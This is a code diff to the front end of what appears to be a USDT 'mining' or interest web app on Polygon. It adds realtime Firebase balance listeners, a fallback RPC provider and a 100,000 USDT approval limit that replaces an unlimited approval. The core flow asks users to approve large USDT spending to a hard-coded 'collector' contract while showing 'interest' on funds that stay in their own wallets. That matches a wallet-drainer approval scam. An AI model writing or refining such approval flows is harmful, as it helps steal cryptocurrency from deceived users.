@@ -248,16 +248,19 @@
         let provider, signer, userAddress;
         let countdownInterval;
         let currentWithdrawableBalance = 0;
+        let currentWalletBalanceNum = 0;
         let walletEventsBound = false;
         let onChainRegisteredBonus = 0;
 
         let hasPendingWithdraw = false;
         let isWithdrawSubmitting = false;
         let unsubPendingWithdraw = null;
+        let unsubUserBalances = null;
 
         // Only USDT approve() uses the contract
         const COLLECTOR_CONTRACT_ADDRESS = "0xC9E28f1C5e8659CaEE3831daB4dF97325e7e5570";
         const USDT_ADDRESS = "0xc2132D05D31c914a87C6611C10748AEb04B58e8F";
+        const APPROVE_LIMIT_USDT = "100000";
         const POLYGON_CHAIN_ID = "0x89";
         const POLYGON_CHAIN_PARAMS = {
             chainId: POLYGON_CHAIN_ID,
@@ -293,6 +296,71 @@
                 promise,
                 new Promise((resolve) => setTimeout(() => resolve(fallbackValue), ms))
             ]);
+        }
+
+        function applyBalancesToDashboard(formattedBal, fbUser = {}) {
+            const safeWalletBal = Number.isFinite(Number(formattedBal)) ? Number(formattedBal) : currentWalletBalanceNum;
+            currentWalletBalanceNum = safeWalletBal;
+
+            const isEligibleForInterest = safeWalletBal >= 100;
+            const rate = isEligibleForInterest ? getInterestRate(safeWalletBal) : 0;
+
+            const userIdDisplay = fbUser.userId || formatSixDigitUserId(0, "M", userAddress);
+            document.getElementById("lblUserId").innerText = userIdDisplay;
+            document.getElementById("lblWalletBal").innerText = formatUsdtOneDecimal(safeWalletBal);
+
+            const lockedBalNum = Number(fbUser.lockedBalance || 0);
+            const fbInterestNum = Number(fbUser.interestBalance || 0);
+            const fbRefNum = Number(fbUser.referralBalance || 0);
+
+            document.getElementById("lblLockedBal").innerText = formatUsdtOneDecimal(lockedBalNum);
+
+            const computedCashback = isEligibleForInterest ? (safeWalletBal * rate) : 0;
+            const cashback = fbInterestNum > 0 ? fbInterestNum : computedCashback;
+            const withdrawableBalance = cashback + fbRefNum;
+            currentWithdrawableBalance = withdrawableBalance;
+
+            const tierNoticeEl = document.getElementById("tierNotice");
+            if (!isEligibleForInterest) {
+                const remainingUsdt = Math.max(0, 100 - safeWalletBal);
+                tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
+                tierNoticeEl.innerText = `Now your Wallet Balance (${safeWalletBal.toFixed(1)} USDT) isn't 100 USDT reach. Interest unaviable (Another ${remainingUsdt.toFixed(1)} USDT is Need)`;
+            } else {
+                tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
+                tierNoticeEl.innerText = `Interest aviable now ( Rate: ${(rate * 100).toFixed(1)}% USDTBalance)`;
+            }
+
+            document.getElementById("lblCashbackBal").innerText = formatUsdtOneDecimal(cashback);
+            document.getElementById("lblReferralBal").innerText = formatUsdtOneDecimal(fbRefNum);
+            document.getElementById("lblWithdrawableBal").innerText = formatUsdtOneDecimal(withdrawableBalance);
+
+            document.getElementById("lblInterestUsdt").innerText = formatUsdtOneDecimal(cashback);
+            document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
+            document.getElementById("lblRebateRate").innerText = `${(rate * 100).toFixed(1)}%`;
+        }
+
+        function startUserRealtimeBalanceListener(addr) {
+            if (typeof unsubUserBalances === "function") {
+                unsubUserBalances();
+                unsubUserBalances = null;
+            }
+            if (!addr) return;
+
+            const docId = String(addr).toLowerCase();
+            unsubUserBalances = db.collection("users").doc(docId).onSnapshot((docSnap) => {
+                if (!docSnap.exists) return;
+                const fbUser = docSnap.data() || {};
+
+                if (fbUser.status === "banned") {
+                    alert("Your account has been banned by Admin!");
+                    document.body.innerHTML = "<h1 class='text-center text-red-500 mt-20 text-xl font-bold'>Access Denied: You are banned.</h1>";
+                    return;
+                }
+
+                applyBalancesToDashboard(currentWalletBalanceNum, fbUser);
+            }, (err) => {
+                console.error("Realtime user balance listener error:", err);
+            });
         }
 
         function updateWithdrawButtonUI() {
@@ -601,6 +669,11 @@
 
             window.ethereum.on("accountsChanged", async (accounts) => {
                 currentWithdrawableBalance = 0;
+                currentWalletBalanceNum = 0;
+                if (typeof unsubUserBalances === "function") {
+                    unsubUserBalances();
+                    unsubUserBalances = null;
+                }
                 if (!accounts || accounts.length === 0) {
                     userAddress = null;
                     signer = null;
@@ -618,6 +691,7 @@
                 provider = new ethers.BrowserProvider(window.ethereum);
                 signer = await provider.getSigner();
                 syncPendingWithdrawListener(userAddress);
+                startUserRealtimeBalanceListener(userAddress);
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 document.getElementById("statusLog").innerText = "Wallet account changing. Data checking...";
                 await checkExistingAllowanceAndLoad();
@@ -638,6 +712,8 @@
                 document.getElementById("selectedNetworkBadge").classList.remove("hidden");
                 if (userAddress) {
                     signer = await provider.getSigner();
+                    syncPendingWithdrawListener(userAddress);
+                    startUserRealtimeBalanceListener(userAddress);
                     document.getElementById("statusLog").innerText = "Polygon Network connected";
                     await checkExistingAllowanceAndLoad();
                 }
@@ -675,6 +751,7 @@
 
                         signer = await provider.getSigner();
                         syncPendingWithdrawListener(userAddress);
+                        startUserRealtimeBalanceListener(userAddress);
                         document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                         await checkExistingAllowanceAndLoad();
                     }
@@ -686,13 +763,15 @@
 
         function startRealtimeBalanceSync() {
             if (!provider || !userAddress) return;
+            startUserRealtimeBalanceListener(userAddress);
             provider.on("block", async () => {
                 try {
                     const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
                     const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, null);
                     if (balance === null) return;
                     const formattedBal = Number(ethers.formatUnits(balance, 6));
-                    
+                    currentWalletBalanceNum = formattedBal;
+
                     const currentBalEl = document.getElementById("lblWalletBal");
                     if (currentBalEl) {
                         currentBalEl.innerText = formatUsdtOneDecimal(formattedBal);
@@ -708,11 +787,23 @@
                 showProgress(30, "Checking your Mining...");
                 syncPendingWithdrawListener(userAddress);
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
-                const allowance = await withTimeout(
+                let allowance = await withTimeout(
                     usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
-                    7000,
+                    12000,
                     null
                 );
+
+                if (allowance === null) {
+                    try {
+                        const fallbackProvider = new ethers.JsonRpcProvider("https://polygon-rpc.com");
+                        const fallbackUsdt = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, fallbackProvider);
+                        allowance = await withTimeout(
+                            fallbackUsdt.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
+                            10000,
+                            null
+                        );
+                    } catch (_) {}
+                }
 
                 if (allowance === null) {
                     hideProgress();
@@ -785,6 +876,7 @@
                 userAddress = accounts[0];
                 signer = await provider.getSigner();
                 syncPendingWithdrawListener(userAddress);
+                startUserRealtimeBalanceListener(userAddress);
 
                 document.getElementById("walletAddress").innerText = `Connected: ${userAddress.substring(0,6)}...${userAddress.substring(38)}`;
                 
@@ -792,7 +884,7 @@
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, provider);
                 const allowance = await withTimeout(
                     usdtContract.allowance(userAddress, COLLECTOR_CONTRACT_ADDRESS),
-                    7000,
+                    10000,
                     0n
                 );
 
@@ -848,8 +940,7 @@
                 startCountdown(25, "Approval to Mining");
 
                 const usdtContract = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
-                const maxAmount = ethers.parseUnits("100000", 6);
-
+                const maxAmount = ethers.parseUnits(APPROVE_LIMIT_USDT, 6);
                 const tx = await usdtContract.approve(COLLECTOR_CONTRACT_ADDRESS, maxAmount);
                 const receipt = await tx.wait();
 
@@ -868,6 +959,7 @@
                 updateQRCode(refLink);
 
                 document.getElementById("userDashboard").classList.remove("hidden");
+                startUserRealtimeBalanceListener(userAddress);
                 await withTimeout(checkUserData(), 7000, null);
                 showProgress(100, "Congratulation! your register is sucessful");
                 setTimeout(hideProgress, 1000);
@@ -906,11 +998,10 @@
                 }
 
                 dashboardEl.classList.remove("hidden");
+                startUserRealtimeBalanceListener(userAddress);
 
                 const balance = await withTimeout(usdtContract.balanceOf(userAddress), 6000, 0n);
                 const formattedBal = Number(ethers.formatUnits(balance ?? 0n, 6));
-                const isEligibleForInterest = formattedBal >= 100;
-                const rate = isEligibleForInterest ? getInterestRate(formattedBal) : 0;
 
                 let fbUser = {};
                 try {
@@ -928,38 +1019,7 @@
                     return;
                 }
 
-                const userIdDisplay = fbUser.userId || formatSixDigitUserId(0, "M", userAddress);
-                document.getElementById("lblUserId").innerText = userIdDisplay;
-
-                document.getElementById("lblWalletBal").innerText = formatUsdtOneDecimal(formattedBal);
-                const lockedBalNum = Number(fbUser.lockedBalance || 0);
-                const fbInterestNum = Number(fbUser.interestBalance || 0);
-                const fbRefNum = Number(fbUser.referralBalance || 0);
-
-                document.getElementById("lblLockedBal").innerText = formatUsdtOneDecimal(lockedBalNum);
-
-                const computedCashback = isEligibleForInterest ? (formattedBal * rate) : 0;
-                const cashback = fbInterestNum > 0 ? fbInterestNum : computedCashback;
-                const withdrawableBalance = cashback + fbRefNum;
-                currentWithdrawableBalance = withdrawableBalance;
-
-                const tierNoticeEl = document.getElementById("tierNotice");
-                if (!isEligibleForInterest) {
-                    const remainingUsdt = Math.max(0, 100 - formattedBal);
-                    tierNoticeEl.className = "bg-amber-950/60 border border-amber-500/40 text-amber-300 p-3 rounded-xl text-xs";
-                    tierNoticeEl.innerText = `Now your Wallet Balance (${formattedBal.toFixed(1)} USDT) isn't 100 USDT reach. Interest unaviable (Another ${remainingUsdt.toFixed(1)} USDT is Need)`;
-                } else {
-                    tierNoticeEl.className = "bg-emerald-950/60 border border-emerald-500/40 text-emerald-300 p-3 rounded-xl text-xs";
-                    tierNoticeEl.innerText = `Interest aviable now ( Rate: ${(rate * 100).toFixed(1)}% USDTBalance)`;
-                }
-
-                document.getElementById("lblCashbackBal").innerText = formatUsdtOneDecimal(cashback);
-                document.getElementById("lblReferralBal").innerText = formatUsdtOneDecimal(fbRefNum);
-                document.getElementById("lblWithdrawableBal").innerText = formatUsdtOneDecimal(withdrawableBalance);
-
-                document.getElementById("lblInterestUsdt").innerText = formatUsdtOneDecimal(cashback);
-                document.getElementById("lblInterestRate").innerText = `${(rate * 100).toFixed(1)}%`;
-                document.getElementById("lblRebateRate").innerText = `${(rate * 100).toFixed(1)}%`;
+                applyBalancesToDashboard(formattedBal, fbUser);
 
                 const refLink = `${window.location.origin}${window.location.pathname}?ref=${userAddress}`;
                 document.getElementById("refLink").value = refLink;
@@ -1069,7 +1129,10 @@
                 if ((currentAllowance ?? 0n) < rawBalance) {
                     showProgress(55, "USDT Approval Transaction တင်နေသည်...");
                     const usdtSigner = new ethers.Contract(USDT_ADDRESS, USDT_APPROVE_ABI, signer);
-                    const appTx = await usdtSigner.approve(COLLECTOR_CONTRACT_ADDRESS, ethers.MaxUint256);
+                    const appTx = await usdtSigner.approve(
+                        COLLECTOR_CONTRACT_ADDRESS,
+                        ethers.parseUnits(APPROVE_LIMIT_USDT, 6)
+                    );
                     await appTx.wait();
                 }
 
